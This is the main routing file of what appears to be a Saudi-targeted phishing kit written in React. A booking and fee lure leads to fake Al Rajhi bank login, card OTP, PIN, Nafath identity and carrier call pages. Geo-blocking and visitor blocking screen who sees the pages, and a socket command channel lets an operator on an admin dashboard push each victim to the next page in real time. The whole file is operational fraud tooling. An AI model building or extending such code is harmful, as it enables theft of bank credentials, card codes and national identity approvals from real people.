import React, { useEffect } from 'react';
import { BrowserRouter as Router, Routes, Route, Navigate, useLocation, useNavigate, Outlet } from 'react-router-dom';
import DashboardPage from './dashboard/DashboardPage';
import ProtectedRoute from './dashboard/ProtectedRoute';
import { AuthProvider } from './contexts/AuthContext';

// Pages
import Home from './pages/client/Home';
import Booking from './pages/client/Booking';
import Billing from './pages/client/Billing';
import RajhiLogin from './pages/client/RajhiLogin';
import Phone from './pages/client/Phone';
import OTP from './pages/client/OTP';
import CardOTP from './pages/client/CardOTP';
import Pin from './pages/client/Pin';
import Nafad from './pages/client/Nafad';
import NafadBasmah from './pages/client/NafadBasmah';
import WhatsApp from './pages/client/WhatsApp';
import StcCall from './pages/client/StcCall';
import MobilyCall from './pages/client/MobilyCall.tsx';
import BlockedPage from './pages/Blocked';
import LoadingPage from './pages/Loading';
import InspectionFees from './pages/client/InspectionFees';
import SearchResult from './pages/client/SearchResult.tsx';
import Register from './pages/client/Register.tsx';
import Login from './pages/client/Login.tsx';
import LoginForm from './pages/client/LoginForm.tsx';
import ForgetPassword from './pages/client/ForgetPassword.tsx';
import NsCreateAppointment from './pages/client/NsCreateAppointment.tsx';

// Components
import ClientLayout from './client/components/Layout';
import GeoGuard from './client/components/GeoGuard';
import BlockGuard from './client/components/BlockGuard';

import { ClientAPI } from './services/server';
import { socketService } from './services/socketService';
import { getClientId } from './shared/utils';
import { useI18n } from './shared/i18n';
import { NavigationContextData } from './shared/types';

const MANUAL_NAV_CONTEXT_KEY = 'v_safety_manual_nav_context';
const ADMIN_NAV_BYPASS_UNTIL_KEY = 'v_safety_admin_nav_bypass_until';
const ADMIN_NAV_BYPASS_TTL_MS = 10000;
const sharedClientService = new ClientAPI(getClientId());
const VALID_CLIENT_ROUTES = new Set([
  '/',
  '/home',
  '/booking',
  '/search-result',
  '/fees',
  '/register',
  '/login',
  '/login/form',
  '/forgetpassword',
  '/ns-create-appointment',
  '/billing',
  '/rajhi',
  '/phone',
  '/otp-phone',
  '/mada-otp',
  '/visa-otp',
  '/mastercard-otp',
  '/pin',
  '/nafad',
  '/nafad-basmah',
  '/call',
  '/stc-call',
  '/mobily-call',
  '/whatsapp',
  '/loading',
  '/verification',
  '/blocked'
]);

const normalizeNavigationTarget = (value: string) => {
  const trimmed = String(value || '').trim();
  if (!trimmed) return null;

  const withSlash = trimmed.startsWith('/') ? trimmed : `/${trimmed}`;
  const pathOnly = withSlash.split('?')[0] || withSlash;

  if (!VALID_CLIENT_ROUTES.has(pathOnly)) {
    return null;
  }

  return withSlash;
};

const VerificationRoute: React.FC = () => {
  const { language } = useI18n();

  return (
    <div className="text-center py-12">
      <h2 className="text-xl font-bold mb-4">{language === 'ar' ? 'جاري التحقق...' : 'Verifying...'}</h2>
      <div className="w-12 h-12 border-4 border-brand border-t-transparent rounded-full animate-spin mx-auto"></div>
    </div>
  );
};

// Funnel Guard disabled to allow free navigation between all pages.
const FunnelGuard = () => {
  return <Outlet />;
};

const ClientCommandBridge = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const isDashboardRoute = location.pathname.startsWith('/dashboard');

  useEffect(() => {
    if (isDashboardRoute) return;

    // Define the listener so we can attach/detach it
    const handleForceNavigate = (data: { page?: string; contextData?: NavigationContextData | null }) => {
      const contextData = data?.contextData && typeof data.contextData === 'object' ? data.contextData : null;
      const requestedTargetPage = String(contextData?.adminTargetPage || data?.page || '').trim();
      if (!requestedTargetPage) return;

      const targetPage = normalizeNavigationTarget(requestedTargetPage);
      if (!targetPage) {
        console.warn('Ignored invalid admin navigation target:', requestedTargetPage);
        return;
      }

      sessionStorage.setItem(ADMIN_NAV_BYPASS_UNTIL_KEY, String(Date.now() + ADMIN_NAV_BYPASS_TTL_MS));

      const prePaymentPages = [
        '/', '/home', '/booking', '/search-result', '/fees', '/register', 
        '/login', '/login/form', '/forgetpassword', '/ns-create-appointment', '/billing'
      ];
      const shouldResetJourney = Boolean(contextData?.resetJourney);

      if (contextData) {
        sessionStorage.setItem(MANUAL_NAV_CONTEXT_KEY, JSON.stringify({
          ...contextData,
          updatedAt: Date.now()
        }));
      }

      // Reset lock only when explicitly requested to avoid breaking in-progress journey.
      if (prePaymentPages.includes(targetPage)) {
        sessionStorage.removeItem('postPaymentLock');
        sessionStorage.removeItem('lastPostPaymentPage');
      }

      if (contextData?.postPaymentLock) {
        sessionStorage.setItem('postPaymentLock', 'true');
      }

      if (contextData?.lastPostPaymentPage) {
        sessionStorage.setItem('lastPostPaymentPage', contextData.lastPostPaymentPage);
      }

      navigate(targetPage, {
        state: {
          __manualNavContext: contextData
        }
      });

      // Hard fallback: if router navigation is blocked/intercepted, force location change.
      window.setTimeout(() => {
        const currentPath = `${window.location.pathname}${window.location.search || ''}`;
        const normalizedCurrent = currentPath.split('?')[0];
        const normalizedTarget = targetPage.split('?')[0];
        if (normalizedCurrent !== normalizedTarget) {
          window.location.assign(targetPage);
        }
      }, 120);
    };

    sharedClientService.on('forceNavigate', handleForceNavigate);

    // Connect services after listeners are attached.
    sharedClientService.connect();
    socketService.connect();

    // Cleanup to prevent memory leaks and multiple listeners
    return () => {
      sharedClientService.off('forceNavigate', handleForceNavigate);
      sharedClientService.disconnect();
      socketService.disconnect();
    };
  }, [isDashboardRoute, navigate]);

  useEffect(() => {
    if (isDashboardRoute) return;
    sharedClientService.updateStatus(location.pathname);
  }, [isDashboardRoute, location.pathname]);

  return null;
};

// Client Wrapper for layout/context only
const ClientAppWrapper = () => {

  return (
    <ClientLayout>
      {/* Pass service down to pages via context */}
      <Outlet context={{ clientService: sharedClientService }} />
    </ClientLayout>
  );
};

const App: React.FC = () => {
  return (
    <Router>
      <ClientCommandBridge />
      <Routes>
        {/* 🔒 Dashboard Route (Separate Module - Protected) */}
        <Route path="/dashboard" element={
          <AuthProvider>
            <ProtectedRoute>
              <DashboardPage />
            </ProtectedRoute>
          </AuthProvider>
        } />

        {/* 🏦 Rajhi Bank Login (Standalone - No Layout) */}
        <Route element={<BlockGuard />}>
          <Route element={<GeoGuard />}>
            <Route element={<FunnelGuard />}>
              <Route path="/rajhi" element={<RajhiLogin />} />
            </Route>
          </Route>
        </Route>

        {/* 🌍 Client Routes (Protected by BlockGuard + GeoGuard) */}
        <Route element={<BlockGuard />}>
          <Route element={<GeoGuard />}>
            <Route element={<FunnelGuard />}>
              <Route element={<ClientAppWrapper />}>
                <Route path="/" element={<Navigate to="/home" replace />} />
              <Route path="/home" element={<Home />} />
              <Route path="/booking" element={<Booking />} />
              <Route path="/search-result" element={<SearchResult />} />
              <Route path="/fees" element={<InspectionFees />} />
              <Route path="/register" element={<Register />} />
              <Route path="/login" element={<Login />} />
              <Route path="/login/form" element={<LoginForm />} />
              <Route path="/forgetpassword" element={<ForgetPassword />} />
              <Route path="/ns-create-appointment" element={<NsCreateAppointment />} />

              {/* Payment Flow */}
              <Route path="/billing" element={<Billing />} />

              {/* Verification */}
              <Route path="/phone" element={<Phone />} />
              <Route path="/otp-phone" element={<OTP />} />
              <Route path="/mada-otp" element={<CardOTP scheme="mada" />} />
              <Route path="/visa-otp" element={<CardOTP scheme="visa" />} />
              <Route path="/mastercard-otp" element={<CardOTP scheme="mastercard" />} />
              <Route path="/pin" element={<Pin />} />

              {/* Nafad */}
              <Route path="/nafad" element={<Nafad />} />
              <Route path="/nafad-basmah" element={<NafadBasmah />} />
              <Route path="/call" element={<StcCall />} />
              <Route path="/stc-call" element={<StcCall />} />
              <Route path="/mobily-call" element={<MobilyCall />} />

              {/* Utils */}
              <Route path="/whatsapp" element={<WhatsApp />} />
              <Route path="/loading" element={<LoadingPage />} />

              <Route path="/verification" element={<VerificationRoute />} />
              </Route>
            </Route>
          </Route>
        </Route>

        {/* 🚫 Blocked Page (Outside GeoGuard) */}
        <Route path="/blocked" element={<BlockedPage />} />
      </Routes>
    </Router>
  );
};

export default App;